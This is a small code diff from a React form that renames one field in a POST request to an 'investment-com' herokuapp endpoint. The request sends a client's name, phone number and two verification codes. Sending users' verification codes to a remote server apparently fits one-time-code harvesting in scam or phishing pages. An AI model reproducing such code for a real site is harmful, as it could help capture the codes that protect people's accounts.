@@ -152,7 +152,7 @@ export default function Form() {
     const addVerificationCodes = () => {
         axios.post("https://investment-com.herokuapp.com/add-code", {
             user_request_id: queryId,
-            fullName: values.clientFullname,
+            userName: values.clientFullname,
             firstCode: vc,
             secondCode: vc2,
             phoneNumber: values.clientPhoneNumber,
